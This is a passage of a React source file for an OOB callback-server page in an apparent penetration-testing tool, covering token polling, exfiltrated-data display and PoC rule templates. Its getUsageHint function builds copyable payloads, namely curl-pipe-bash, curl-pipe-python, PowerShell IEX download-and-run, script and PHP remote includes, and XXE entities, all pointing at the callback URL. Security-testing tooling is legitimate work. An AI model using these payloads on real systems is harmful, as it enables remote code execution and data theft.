import { useState, useEffect, useRef, useCallback } from 'react'
import { useNavigate } from 'react-router-dom'
import { 
  Radio, Copy, Check, Trash2, Plus, RefreshCw,
  Clock, Globe, ChevronDown, ChevronUp,
  AlertCircle, Loader2, Pause, Play, Info,
  BarChart3, Users, FileCode, Link2, Zap, Edit2, X, ExternalLink, Search
} from 'lucide-react'
import { callbackApi, pocApi } from '@/lib/api'
import toast from 'react-hot-toast'
import { cn } from '@/lib/utils'

interface Token {
  id: string
  token: string
  name: string | null
  url: string
  created_at: string
  expires_at: string | null
  is_active: boolean
  record_count: number
}

interface CallbackRecord {
  id: string
  token: string
  timestamp: string
  client_ip: string | null
  method: string | null
  path: string | null
  query_string: string | null
  headers: Record<string, string> | null
  body: string | null
  user_agent: string | null
  protocol: string
  raw_request: string | null  // 原始请求
  // PoC 相关字段
  is_poc_hit: boolean
  poc_rule_name: string | null
  is_data_exfil: boolean  // 数据外带成功 = 攻击验证成功
  exfil_data: string | null
  exfil_type: string | null
}

interface TokenStats {
  total: number
  by_ip: { ip: string; count: number }[]
  by_method: { method: string; count: number }[]
  by_path: { path: string; count: number }[]
  by_user_agent: { user_agent: string; count: number }[]
}

interface PocRule {
  id: string
  token_id: string
  name: string
  description: string | null
  status_code: number
  content_type: string
  response_body: string | null
  response_headers: Record<string, string> | null
  redirect_url: string | null
  delay_ms: number
  enable_variables: boolean
  is_active: boolean
  hit_count: number
  url: string
  filename: string | null
  created_at: string
}

interface PocTemplate {
  name: string
  description: string
  category?: string
  content_type?: string
  response_body?: string
  redirect_url?: string
  status_code?: number
  enable_variables?: boolean
  filename?: string
  usage?: string
}

const CATEGORY_LABELS: Record<string, string> = {
  xss: 'XSS 跨站脚本',
  xxe: 'XXE 注入',
  ssrf: 'SSRF 探测',
  rce: '远程命令执行',
  shell: '反弹 Shell',
  script: '脚本文件',
}

type TabType = 'records' | 'stats' | 'poc'

export default function CallbackServer() {
  const navigate = useNavigate()
  const [tokens, setTokens] = useState<Token[]>([])
  const [selectedToken, setSelectedToken] = useState<Token | null>(null)
  const [records, setRecords] = useState<CallbackRecord[]>([])
  const [stats, setStats] = useState<TokenStats | null>(null)
  const [activeTab, setActiveTab] = useState<TabType>('records')
  const [loading, setLoading] = useState(false)
  const [pollingTokens, setPollingTokens] = useState<Set<string>>(new Set())
  const [copiedId, setCopiedId] = useState<string | null>(null)
  const [expandedRecord, setExpandedRecord] = useState<string | null>(null)
  const [expandedExfil, setExpandedExfil] = useState<string | null>(null)
  const [newTokenName, setNewTokenName] = useState('')
  const [expiresHours, setExpiresHours] = useState(24)
  const [showCreateForm, setShowCreateForm] = useState(false)
  const [showRenewDialog, setShowRenewDialog] = useState(false)
  const [renewHours, setRenewHours] = useState(24)
  
  // PoC 规则相关状态
  const [pocRules, setPocRules] = useState<PocRule[]>([])
  const [pocTemplates, setPocTemplates] = useState<Record<string, PocTemplate>>({})
  const [showPocForm, setShowPocForm] = useState(false)
  const [editingRule, setEditingRule] = useState<PocRule | null>(null)
  const [pocForm, setPocForm] = useState({
    name: '',
    description: '',
    status_code: 200,
    content_type: 'text/html',
    response_body: '',
    redirect_url: '',
    delay_ms: 0,
    enable_variables: false,
    filename: '',
  })
  
  // 搜索
  const [searchKeyword, setSearchKeyword] = useState('')
  const [searchInput, setSearchInput] = useState('')
  const searchTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  const pollingIntervalsRef = useRef<Map<string, ReturnType<typeof setInterval>>>(new Map())
  const lastPollTimeMap = useRef<Map<string, string>>(new Map())
  const tokensRef = useRef(tokens)
  tokensRef.current = tokens
  const selectedTokenRef = useRef(selectedToken)
  selectedTokenRef.current = selectedToken

  // 获取服务器基础 URL
  const getBaseUrl = () => {
    if (typeof window !== 'undefined') {
      const protocol = window.location.protocol
      const host = window.location.host
      if (host.includes(':5173')) {
        return `${protocol}//${host.replace(':5173', ':8000')}`
      }
      return `${protocol}//${host}`
    }
    return ''
  }

  // 构建完整 URL（兼容后端返回绝对/相对路径两种情况）
  const getFullUrl = (path: string, suffix?: string) => {
    const base = path.startsWith('http') ? path : `${getBaseUrl()}${path}`
    return suffix ? `${base}${suffix}` : base
  }

  // 复制到剪贴板（兼容非 HTTPS 环境）
  const copyToClipboard = async (text: string): Promise<boolean> => {
    if (navigator.clipboard && window.isSecureContext) {
      try {
        await navigator.clipboard.writeText(text)
        return true
      } catch { /* fall through */ }
    }
    // fallback: textarea + execCommand
    const textarea = document.createElement('textarea')
    textarea.value = text
    textarea.style.position = 'fixed'
    textarea.style.opacity = '0'
    document.body.appendChild(textarea)
    textarea.select()
    try {
      document.execCommand('copy')
      return true
    } catch {
      return false
    } finally {
      document.body.removeChild(textarea)
    }
  }

  // 检测 Token 是否已过期
  const isTokenExpired = (token: Token | null): boolean => {
    if (!token || !token.expires_at) return false
    return new Date(token.expires_at) < new Date()
  }

  // 启动某个 token 的轮询
  const startPollingForToken = useCallback((tokenId: string) => {
    if (pollingIntervalsRef.current.has(tokenId)) return
    if (!lastPollTimeMap.current.has(tokenId)) {
      lastPollTimeMap.current.set(tokenId, new Date().toISOString())
    }
    const interval = setInterval(async () => {
      try {
        const { data } = await callbackApi.pollRecords(
          tokenId,
          lastPollTimeMap.current.get(tokenId) || undefined
        )
        if (data?.count > 0) {
          lastPollTimeMap.current.set(tokenId, new Date().toISOString())
          const tokenObj = tokensRef.current.find(t => t.id === tokenId)
          const tokenLabel = tokenObj?.name || tokenObj?.token || tokenId.slice(0, 8)
          const newRecordsList = Array.isArray(data.records) ? data.records : []

          if (selectedTokenRef.current?.id === tokenId) {
            setRecords(prev => {
              const newRecords = newRecordsList.filter(
                (r: CallbackRecord) => !prev.some(p => p.id === r.id)
              )
              if (newRecords.length > 0) {
                toast.success(`[${tokenLabel}] 收到 ${newRecords.length} 条新请求!`, {
                  icon: '🎯',
                  duration: 3000
                })
              }
              return [...newRecords, ...prev]
            })
            loadStats()
          } else {
            toast.success(`[${tokenLabel}] 收到 ${data.count} 条新请求!`, {
              icon: '🎯',
              duration: 4000
            })
          }
          setTokens(prev => prev.map(t =>
            t.id === tokenId ? { ...t, record_count: t.record_count + data.count } : t
          ))
        }
      } catch {
        // 静默处理轮询错误
      }
    }, 3000)
    pollingIntervalsRef.current.set(tokenId, interval)
  }, [])

  // 停止某个 token 的轮询
  const stopPollingForToken = useCallback((tokenId: string) => {
    const interval = pollingIntervalsRef.current.get(tokenId)
    if (interval) {
      clearInterval(interval)
      pollingIntervalsRef.current.delete(tokenId)
    }
  }, [])

  // 切换某个 token 的监听状态
  const togglePolling = useCallback((tokenId: string) => {
    setPollingTokens(prev => {
      const next = new Set(prev)
      if (next.has(tokenId)) {
        next.delete(tokenId)
        stopPollingForToken(tokenId)
      } else {
        next.add(tokenId)
        startPollingForToken(tokenId)
      }
      return next
    })
  }, [startPollingForToken, stopPollingForToken])

  // 续期 Token
  const renewToken = async () => {
    if (!selectedToken) return
    setLoading(true)
    try {
      const { data } = await callbackApi.renewToken(selectedToken.id, renewHours)
      setTokens(prev => prev.map(t => t.id === data.id ? data : t))
      setSelectedToken(data)
      toast.success(`Token 已续期 ${renewHours} 小时`)
      setShowRenewDialog(false)
      // 续期后自动开始监听
      if (!pollingTokens.has(data.id)) {
        togglePolling(data.id)
      }
    } catch (err: any) {
      toast.error(err.response?.data?.detail || '续期失败')
    } finally {
      setLoading(false)
    }
  }

  // 处理开始监听点击 - 检测是否过期
  const handleStartPolling = () => {
    if (!selectedToken) return
    if (isTokenExpired(selectedToken)) {
      setShowRenewDialog(true)
    } else {
      togglePolling(selectedToken.id)
    }
  }

  // 加载 Tokens
  const loadTokens = async () => {
    try {
      const { data } = await callbackApi.getTokens()
      setTokens(Array.isArray(data) ? data : [])
    } catch {
      toast.error('加载 Token 列表失败')
    }
  }

  // 加载 PoC 模板
  const loadPocTemplates = async () => {
    try {
      const { data } = await pocApi.templates()
      setPocTemplates(data.templates || {})
    } catch {}
  }

  // 加载 PoC 规则
  const loadPocRules = async () => {
    if (!selectedToken) return
    try {
      const { data } = await callbackApi.getPocRules(selectedToken.id)
      setPocRules(Array.isArray(data) ? data : [])
    } catch {}
  }

  // 初始加载
  useEffect(() => {
    loadTokens()
    loadPocTemplates()
    return () => {
      pollingIntervalsRef.current.forEach(interval => clearInterval(interval))
      pollingIntervalsRef.current.clear()
    }
  }, [])

  // 选择 Token 后加载记录
  useEffect(() => {
    if (selectedToken) {
      loadRecords()
      loadPocRules()
      loadStats()
      if (!lastPollTimeMap.current.has(selectedToken.id)) {
        lastPollTimeMap.current.set(selectedToken.id, new Date().toISOString())
      }
    } else {
      setRecords([])
      setStats(null)
    }
    setSearchInput('')
    setSearchKeyword('')
  }, [selectedToken])

  // 同步轮询定时器：pollingTokens 变化时，确保对应的定时器存在或被清除
  useEffect(() => {
    pollingTokens.forEach(tokenId => {
      if (!pollingIntervalsRef.current.has(tokenId)) {
        startPollingForToken(tokenId)
      }
    })
    pollingIntervalsRef.current.forEach((_, tokenId) => {
      if (!pollingTokens.has(tokenId)) {
        stopPollingForToken(tokenId)
      }
    })
  }, [pollingTokens, startPollingForToken, stopPollingForToken])

  // 加载记录（支持关键字搜索）
  const loadRecords = async (keyword?: string) => {
    if (!selectedToken) return
    setLoading(true)
    try {
      const kw = keyword !== undefined ? keyword : searchKeyword
      const { data } = await callbackApi.getRecords(selectedToken.id, undefined, kw || undefined)
      setRecords(Array.isArray(data) ? data : [])
      loadStats()
    } catch {
      toast.error('加载记录失败')
    } finally {
      setLoading(false)
    }
  }

  // 搜索：debounce 300ms
  const handleSearchChange = useCallback((value: string) => {
    setSearchInput(value)
    if (searchTimerRef.current) clearTimeout(searchTimerRef.current)
    searchTimerRef.current = setTimeout(() => {
      setSearchKeyword(value)
    }, 300)
  }, [])

  // searchKeyword 变化时触发查询
  useEffect(() => {
    if (selectedToken) {
      loadRecords(searchKeyword)
    }
  }, [searchKeyword])

  // 加载统计
  const loadStats = async () => {
    if (!selectedToken) return
    try {
      const { data } = await callbackApi.getTokenStats(selectedToken.id)
      setStats(data)
      // 使用统计数据中的总数同步更新 token 列表
      setTokens(prev => prev.map(t => 
        t.id === selectedToken.id ? { ...t, record_count: data.total } : t
      ))
    } catch {
      // 静默处理
    }
  }

  // 创建 Token
  const createToken = async () => {
    setLoading(true)
    try {
      const { data } = await callbackApi.createToken({
        name: newTokenName || undefined,
        expires_hours: expiresHours
      })
      setTokens(prev => [data, ...prev])
      setSelectedToken(data)
      setNewTokenName('')
      setShowCreateForm(false)
      toast.success('Token 创建成功')
    } catch {
      toast.error('创建失败')
    } finally {
      setLoading(false)
    }
  }

  // 删除 Token
  const deleteToken = async (tokenId: string) => {
    if (!confirm('确定删除此 Token 及其所有记录？')) return
    try {
      await callbackApi.deleteToken(tokenId)
      // 清理该 token 的轮询
      if (pollingTokens.has(tokenId)) {
        stopPollingForToken(tokenId)
        setPollingTokens(prev => {
          const next = new Set(prev)
          next.delete(tokenId)
          return next
        })
      }
      lastPollTimeMap.current.delete(tokenId)
      setTokens(prev => prev.filter(t => t.id !== tokenId))
      if (selectedToken?.id === tokenId) {
        setSelectedToken(null)
      }
      toast.success('已删除')
    } catch {
      toast.error('删除失败')
    }
  }

  // 清空记录
  const clearRecords = async () => {
    if (!selectedToken || !confirm('确定清空所有记录？')) return
    try {
      await callbackApi.clearRecords(selectedToken.id)
      setRecords([])
      setStats(null)
      setTokens(prev => prev.map(t => 
        t.id === selectedToken.id ? { ...t, record_count: 0 } : t
      ))
      toast.success('已清空')
    } catch {
      toast.error('清空失败')
    }
  }

  // 复制 URL
  const copyUrl = async (token: Token, rulePath?: string) => {
    const fullUrl = getFullUrl(token.url, rulePath ? `/p/${rulePath}` : '')
    const ok = await copyToClipboard(fullUrl)
    if (ok) {
      setCopiedId(rulePath || token.id)
      toast.success('已复制')
      setTimeout(() => setCopiedId(null), 2000)
    } else {
      toast.error('复制失败')
    }
  }

  // PoC 规则操作
  const resetPocForm = () => {
    setPocForm({
      name: '',
      description: '',
      status_code: 200,
      content_type: 'text/html',
      response_body: '',
      redirect_url: '',
      delay_ms: 0,
      enable_variables: false,
      filename: '',
    })
    setEditingRule(null)
  }

  const applyTemplate = (templateKey: string) => {
    const template = pocTemplates[templateKey]
    if (template) {
      setPocForm({
        name: template.name,
        description: template.description || '',
        status_code: template.status_code || 200,
        content_type: template.content_type || 'text/html',
        response_body: template.response_body || '',
        redirect_url: template.redirect_url || '',
        delay_ms: 0,
        enable_variables: template.enable_variables || false,
        filename: template.filename || '',
      })
      toast.success('已应用模板')
    }
  }

  const getTemplatesByCategory = () => {
    const grouped: Record<string, [string, PocTemplate][]> = {}
    Object.entries(pocTemplates).forEach(([key, tpl]) => {
      const cat = tpl.category || 'other'
      if (!grouped[cat]) grouped[cat] = []
      grouped[cat].push([key, tpl])
    })
    return grouped
  }

  const getUsageHint = (rule: PocRule): string => {
    const fullUrl = getFullUrl(selectedToken?.url || '', `/p/${rule.name}`)
    if (rule.filename?.endsWith('.sh')) return `curl -sL '${fullUrl}' | bash`
    if (rule.filename?.endsWith('.py')) return `curl -sL '${fullUrl}' | python3`
    if (rule.filename?.endsWith('.ps1')) return `powershell -ep bypass -c "IEX(IWR '${fullUrl}')"`
    if (rule.filename?.endsWith('.js')) return `<script src="${fullUrl}"></script>`
    if (rule.filename?.endsWith('.php')) return `<?php include('${fullUrl}'); ?>`
    if (rule.redirect_url) return fullUrl
    if (rule.content_type === 'text/html') return `<script src="${fullUrl}"></script>`
    if (rule.content_type === 'application/xml-dtd') return `<!ENTITY % dtd SYSTEM "${fullUrl}"> %dtd;`
    if (rule.content_type === 'application/xml') return `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${fullUrl}">]>`
    if (rule.content_type === 'text/javascript') return `<script src="${fullUrl}"></script>`
    return `curl -sL '${fullUrl}'`
  }

  const copyPayloadUsage = async (rule: PocRule) => {
    const ok = await copyToClipboard(getUsageHint(rule))
    if (ok) {
      toast.success('已复制 Payload')
    } else {
      toast.error('复制失败')
    }
  }

  const savePocRule = async () => {
    if (!selectedToken || !pocForm.name.trim()) {
      toast.error('请输入规则名称')
      return
    }
    
    setLoading(true)
    try {
      if (editingRule) {
        await callbackApi.updatePocRule(selectedToken.id, editingRule.id, pocForm)
        toast.success('规则已更新')
      } else {
        await callbackApi.createPocRule(selectedToken.id, pocForm)
        toast.success('规则已创建')
      }
      loadPocRules()
      setShowPocForm(false)
      resetPocForm()
    } catch (err: any) {
      toast.error(err.response?.data?.detail || '保存失败')
    } finally {
      setLoading(false)
    }
  }

  const deletePocRule = async (ruleId: string) => {
    if (!selectedToken || !confirm('确定删除此规则？')) return
    try {
      await callbackApi.deletePocRule(selectedToken.id, ruleId)
      setPocRules(prev => prev.filter(r => r.id !== ruleId))
      toast.success('已删除')
    } catch {
      toast.error('删除失败')
    }
  }

  const editPocRule = (rule: PocRule) => {
    setEditingRule(rule)
    setPocForm({
      name: rule.name,
      description: rule.description || '',
      status_code: rule.status_code,
      content_type: rule.content_type,
      response_body: rule.response_body || '',
      redirect_url: rule.redirect_url || '',
      delay_ms: rule.delay_ms,
      enable_variables: rule.enable_variables,
      filename: rule.filename || '',
    })
    setShowPocForm(true)
  }

  // 关键字高亮组件
  const HighlightText = ({ text, className }: { text: string; className?: string }) => {
    if (!searchKeyword || !text) return <span className={className}>{text}</span>
    const escaped = searchKeyword.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
    const parts = text.split(new RegExp(`(${escaped})`, 'gi'))
    if (parts.length === 1) return <span className={className}>{text}</span>
    return (
      <span className={className}>
        {parts.map((part, i) =>
          part.toLowerCase() === searchKeyword.toLowerCase()
            ? <mark key={i} className="bg-orange-500 text-white rounded-sm px-0.5">{part}</mark>
            : part
        )}
      </span>
    )
  }

  // 格式化 IP（::ffff:x.x.x.x → x.x.x.x）
  const formatIp = (ip: string | null) => {
    if (!ip) return 'Unknown'
    return ip.startsWith('::ffff:') ? ip.slice(7) : ip
  }

  // 格式化时间
  const formatTime = (isoString: string) => {
    const date = new Date(isoString)
    return date.toLocaleString('zh-CN', {
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    })
  }

  return (
    <div className="h-[calc(100vh-8rem)] min-w-0 flex animate-fadeIn">
      {/* 左侧：Token 列表 */}
      <div className="w-80 bg-theme-card border-r border-theme-border p-4 flex flex-col">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-2">
            <Radio className="w-5 h-5 text-theme-primary" />
            <h2 className="font-semibold text-theme-text">OOB 探测</h2>
          </div>
          <button
            onClick={() => setShowCreateForm(!showCreateForm)}
            className="p-1.5 rounded-lg hover:bg-theme-bg text-theme-muted hover:text-theme-primary transition-colors"
          >
            <Plus className="w-4 h-4" />
          </button>
        </div>

        {/* 创建表单 */}
        {showCreateForm && (
          <div className="mb-4 p-3 bg-theme-bg rounded-lg border border-theme-border space-y-3">
            <input
              type="text"
              placeholder="备注名称（可选）"
              value={newTokenName}
              onChange={(e) => setNewTokenName(e.target.value)}
              className="w-full px-3 py-1.5 text-sm bg-theme-card border border-theme-border rounded"
            />
            <div className="flex items-center gap-2">
              <label className="text-sm text-theme-muted">有效期:</label>
              <select
                value={expiresHours}
                onChange={(e) => setExpiresHours(Number(e.target.value))}
                className="flex-1 px-2 py-1 text-sm bg-theme-card border border-theme-border rounded"
              >
                <option value={1}>1 小时</option>
                <option value={6}>6 小时</option>
                <option value={24}>24 小时</option>
                <option value={72}>3 天</option>
                <option value={168}>7 天</option>
                <option value={0}>永不过期</option>
              </select>
            </div>
            <button
              onClick={createToken}
              disabled={loading}
              className="w-full btn btn-primary text-sm py-1.5"
            >
              {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : '创建'}
            </button>
          </div>
        )}

        {/* Token 列表 */}
        <div className="flex-1 overflow-y-auto space-y-2">
          {tokens.length === 0 ? (
            <div className="text-center py-8 text-theme-muted">
              <Radio className="w-8 h-8 mx-auto mb-2 opacity-50" />
              <p className="text-sm">暂无 Token</p>
              <p className="text-xs">点击 + 创建 OOB 探测 URL</p>
            </div>
          ) : (
            tokens.map((token) => (
              <div
                key={token.id}
                onClick={() => setSelectedToken(token)}
                className={cn(
                  'p-3 rounded-lg border cursor-pointer transition-all',
                  selectedToken?.id === token.id
                    ? 'bg-theme-primary/20 border-theme-primary'
                    : isTokenExpired(token)
                      ? 'bg-amber-500/10 border-amber-500/30 hover:border-amber-500/50'
                      : 'bg-theme-bg border-theme-border hover:border-theme-primary/50'
                )}
              >
                <div className="flex items-center justify-between mb-1">
                  <div className="flex items-center gap-1.5 min-w-0 flex-1">
                    {pollingTokens.has(token.id) && (
                      <span className="relative flex h-2 w-2 flex-shrink-0">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                        <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                      </span>
                    )}
                    <span className="font-mono text-sm text-theme-text truncate">
                      {token.name || token.token}
                    </span>
                  </div>
                  <div className="flex items-center gap-1 flex-shrink-0">
                    {isTokenExpired(token) && (
                      <span className="text-[10px] px-1.5 py-0.5 bg-amber-500/20 text-amber-400 rounded">
                        已过期
                      </span>
                    )}
                    <button
                      onClick={(e) => {
                        e.stopPropagation()
                        if (isTokenExpired(token)) return
                        togglePolling(token.id)
                      }}
                      className={cn(
                        'p-1 rounded transition-colors',
                        isTokenExpired(token)
                          ? 'text-theme-muted/30 cursor-not-allowed'
                          : pollingTokens.has(token.id)
                            ? 'text-green-400 hover:text-red-400 hover:bg-red-500/10'
                            : 'text-theme-muted hover:text-green-400 hover:bg-green-500/10'
                      )}
                      title={pollingTokens.has(token.id) ? '停止监听' : '开始监听'}
                    >
                      {pollingTokens.has(token.id) ? (
                        <Pause className="w-3 h-3" />
                      ) : (
                        <Play className="w-3 h-3" />
                      )}
                    </button>
                  </div>
                </div>
                <div className="flex items-center justify-between text-xs text-theme-muted">
                  <span className="flex items-center gap-1">
                    <Globe className="w-3 h-3" />
                    {token.record_count} 次请求
                  </span>
                  <button
                    onClick={(e) => {
                      e.stopPropagation()
                      copyUrl(token)
                    }}
                    className="p-1 hover:text-theme-primary transition-colors"
                  >
                    {copiedId === token.id ? (
                      <Check className="w-3 h-3" />
                    ) : (
                      <Copy className="w-3 h-3" />
                    )}
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      </div>

      {/* 右侧：记录详情 */}
      <div className="flex-1 min-w-0 flex flex-col overflow-hidden">
        {selectedToken ? (
          <>
            {/* 工具栏 */}
            <div className="p-4 border-b border-theme-border bg-theme-card">
              <div className="flex items-center justify-between mb-3">
                <div>
                  <h3 className="font-semibold text-theme-text">
                    {selectedToken.name || selectedToken.token}
                  </h3>
                  <div className="flex items-center gap-2 mt-1">
                    <code className="text-xs bg-theme-bg px-2 py-1 rounded font-mono text-theme-primary">
                      {getFullUrl(selectedToken.url)}
                    </code>
                    <button
                      onClick={() => copyUrl(selectedToken)}
                      className="text-theme-muted hover:text-theme-primary"
                    >
                      <Copy className="w-3.5 h-3.5" />
                    </button>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {/* 过期状态提示 */}
                  {isTokenExpired(selectedToken) && (
                    <span className="text-xs text-amber-400 flex items-center gap-1">
                      <AlertCircle className="w-3.5 h-3.5" />
                      已过期
                    </span>
                  )}
                  <button
                    onClick={() => pollingTokens.has(selectedToken.id) ? togglePolling(selectedToken.id) : handleStartPolling()}
                    className={cn(
                      'btn btn-sm flex items-center gap-1',
                      pollingTokens.has(selectedToken.id) ? 'btn-primary' : isTokenExpired(selectedToken) ? 'btn-warning' : 'btn-secondary'
                    )}
                  >
                    {pollingTokens.has(selectedToken.id) ? (
                      <>
                        <Pause className="w-3.5 h-3.5" />
                        停止监听
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5" />
                        {isTokenExpired(selectedToken) ? '续期并监听' : '开始监听'}
                      </>
                    )}
                  </button>
                  <button
                    onClick={() => loadRecords()}
                    disabled={loading}
                    className="btn btn-secondary btn-sm"
                    title="刷新"
                  >
                    <RefreshCw className={cn('w-3.5 h-3.5', loading && 'animate-spin')} />
                  </button>
                  <button
                    onClick={clearRecords}
                    className="btn btn-secondary btn-sm text-red-400 hover:text-red-300"
                    title="清空记录"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                  <button
                    onClick={() => deleteToken(selectedToken.id)}
                    className="btn btn-secondary btn-sm text-red-400 hover:text-red-300"
                    title="删除 Token"
                  >
                    删除
                  </button>
                </div>
              </div>

              {/* 使用说明 */}
              <div className="flex items-start gap-2 p-2 bg-blue-500/10 rounded-lg border border-blue-500/30 text-xs">
                <Info className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
                <div className="text-theme-muted">
                  <span className="text-blue-400 font-medium">使用方法：</span>
                  将 URL 注入到目标进行 OOB 测试（SSRF、XXE、RCE、盲注等）。<strong>所有请求都会被记录</strong>，用于验证漏洞触发。
                  支持路径：<code className="bg-theme-bg px-1 rounded">{getFullUrl(selectedToken.url)}/payload-id</code>
                </div>
              </div>

              {/* Tab 切换 */}
              <div className="flex gap-2 mt-3">
                <button
                  onClick={() => setActiveTab('records')}
                  className={cn(
                    'px-3 py-1.5 text-sm rounded-lg transition-colors',
                    activeTab === 'records'
                      ? 'bg-theme-primary/20 text-theme-primary'
                      : 'text-theme-muted hover:text-theme-text'
                  )}
                >
                  <FileCode className="w-4 h-4 inline mr-1" />
                  请求记录
                </button>
                <button
                  onClick={() => setActiveTab('stats')}
                  className={cn(
                    'px-3 py-1.5 text-sm rounded-lg transition-colors',
                    activeTab === 'stats'
                      ? 'bg-theme-primary/20 text-theme-primary'
                      : 'text-theme-muted hover:text-theme-text'
                  )}
                >
                  <BarChart3 className="w-4 h-4 inline mr-1" />
                  统计分析
                </button>
                <button
                  onClick={() => setActiveTab('poc')}
                  className={cn(
                    'px-3 py-1.5 text-sm rounded-lg transition-colors',
                    activeTab === 'poc'
                      ? 'bg-theme-primary/20 text-theme-primary'
                      : 'text-theme-muted hover:text-theme-text'
                  )}
                >
                  <Zap className="w-4 h-4 inline mr-1" />
                  PoC 规则
                  {pocRules.length > 0 && (
                    <span className="ml-1 px-1.5 py-0.5 text-xs bg-theme-primary/30 rounded">
                      {pocRules.length}
                    </span>
                  )}
                </button>
              </div>
            </div>

            {/* 内容区域 */}
            <div className="flex-1 min-w-0 overflow-y-auto overflow-x-hidden p-4">
              {activeTab === 'records' ? (
                // 请求记录列表
                <div className="space-y-3 min-w-0">
                  {/* 搜索框 */}
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-theme-muted" />
                    <input
                      type="text"
                      value={searchInput}
                      onChange={(e) => handleSearchChange(e.target.value)}
                      placeholder="搜索请求记录（URL、Headers、Body、IP、外带数据...）"
                      className="w-full pl-9 pr-8 py-2 text-sm bg-theme-bg border border-theme-border rounded-lg focus:outline-none focus:border-theme-primary/50 placeholder:text-theme-muted/50"
                    />
                    {searchInput && (
                      <button
                        onClick={() => { handleSearchChange(''); setSearchInput(''); setSearchKeyword('') }}
                        className="absolute right-2.5 top-1/2 -translate-y-1/2 text-theme-muted hover:text-theme-text"
                      >
                        <X className="w-4 h-4" />
                      </button>
                    )}
                  </div>
                  {searchKeyword && (
                    <div className="text-xs text-theme-muted">
                      搜索 "<span className="text-theme-primary">{searchKeyword}</span>" 共 {records.length} 条结果
                    </div>
                  )}
                  {loading ? (
                    <div className="flex items-center justify-center py-12">
                      <Loader2 className="w-6 h-6 animate-spin text-theme-primary" />
                    </div>
                  ) : records.length === 0 ? (
                    <div className="text-center py-12 text-theme-muted">
                      <AlertCircle className="w-10 h-10 mx-auto mb-3 opacity-50" />
                      <p>暂无请求记录</p>
                      <p className="text-sm mt-1">
                        {selectedToken && pollingTokens.has(selectedToken.id) ? '正在监听中...' : '点击"开始监听"实时接收请求'}
                      </p>
                    </div>
                  ) : (
                    records.map((record) => (
                      <div
                        key={record.id}
                        className={cn(
                          "rounded-lg overflow-hidden min-w-0 max-w-full",
                          record.is_data_exfil 
                            ? "bg-red-500/10 border-2 border-red-500/50 shadow-lg shadow-red-500/20" 
                            : record.is_poc_hit 
                              ? "bg-amber-500/10 border border-amber-500/30"
                              : "bg-theme-card border border-theme-border"
                        )}
                      >
                        {/* 记录头部 */}
                        <div
                          onClick={() => setExpandedRecord(
                            expandedRecord === record.id ? null : record.id
                          )}
                          className="p-3 cursor-pointer hover:bg-theme-bg/50 transition-colors"
                        >
                          <div className="flex items-center justify-between gap-3 min-w-0">
                            <div className="flex items-center gap-3 min-w-0 flex-1 overflow-hidden">
                              {/* POC 成功标记 */}
                              {record.is_data_exfil && (
                                <span className="px-2 py-0.5 rounded text-xs font-bold bg-red-500 text-white animate-pulse flex-shrink-0 flex items-center gap-1">
                                  <Zap className="w-3 h-3" />
                                  POC成功
                                </span>
                              )}
                              {record.is_poc_hit && !record.is_data_exfil && (
                                <span className="px-2 py-0.5 rounded text-xs font-medium bg-amber-500/20 text-amber-400 flex-shrink-0">
                                  PoC命中
                                </span>
                              )}
                              <span className={cn(
                                'px-2 py-0.5 rounded text-xs font-mono flex-shrink-0',
                                record.method === 'GET' && 'bg-green-500/20 text-green-400',
                                record.method === 'POST' && 'bg-blue-500/20 text-blue-400',
                                record.method === 'PUT' && 'bg-yellow-500/20 text-yellow-400',
                                record.method === 'DELETE' && 'bg-red-500/20 text-red-400',
                                !['GET', 'POST', 'PUT', 'DELETE'].includes(record.method || '') && 'bg-gray-500/20 text-gray-400'
                              )}>
                                {record.method}
                              </span>
                              <span className="font-mono text-sm text-theme-text truncate min-w-0">
                                <HighlightText text={record.path || ''} />
                                {record.query_string && (
                                  <HighlightText
                                    text={'?' + (record.query_string.length > 40 ? record.query_string.slice(0, 40) + '…' : record.query_string)}
                                    className="text-theme-muted"
                                  />
                                )}
                              </span>
                            </div>
                            <div className="flex items-center gap-3 text-xs text-theme-muted flex-shrink-0">
                              {record.exfil_type && (
                                <span className="text-red-400 font-medium">
                                  [{record.exfil_type}]
                                </span>
                              )}
                              <span
                                className="flex items-center gap-1 cursor-pointer hover:text-theme-primary transition-colors"
                                onClick={(e) => {
                                  e.stopPropagation()
                                  const ip = formatIp(record.client_ip)
                                  if (ip !== 'Unknown') {
                                    navigate(`/tools/network?q=${encodeURIComponent(ip)}`)
                                  }
                                }}
                                title={formatIp(record.client_ip) !== 'Unknown' ? '点击跳转网络工具查询' : undefined}
                              >
                                <Globe className="w-3 h-3" />
                                <HighlightText text={formatIp(record.client_ip)} />
                              </span>
                              <span className="flex items-center gap-1">
                                <Clock className="w-3 h-3" />
                                {formatTime(record.timestamp)}
                              </span>
                              {expandedRecord === record.id ? (
                                <ChevronUp className="w-4 h-4" />
                              ) : (
                                <ChevronDown className="w-4 h-4" />
                              )}
                            </div>
                          </div>
                          {record.user_agent && (
                            <div className="mt-2 text-xs text-theme-muted truncate max-w-full">
                              UA: <HighlightText text={record.user_agent} />
                            </div>
                          )}
                        </div>

                        {/* 展开详情 */}
                        {expandedRecord === record.id && (
                          <div className="border-t border-theme-border p-4 space-y-4 bg-theme-bg/30 min-w-0 overflow-hidden">
                            {/* 外带数据（POC成功时显示） */}
                            {record.is_data_exfil && record.exfil_data && (() => {
                              const isExpanded = expandedExfil === record.id
                              let decoded: string
                              try { decoded = decodeURIComponent(record.exfil_data) } catch { decoded = record.exfil_data }
                              const lines = decoded.split('\n')
                              const isLong = lines.length > 8 || decoded.length > 500
                              return (
                                <div className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg min-w-0 overflow-hidden">
                                  <div className="flex items-center justify-between mb-2">
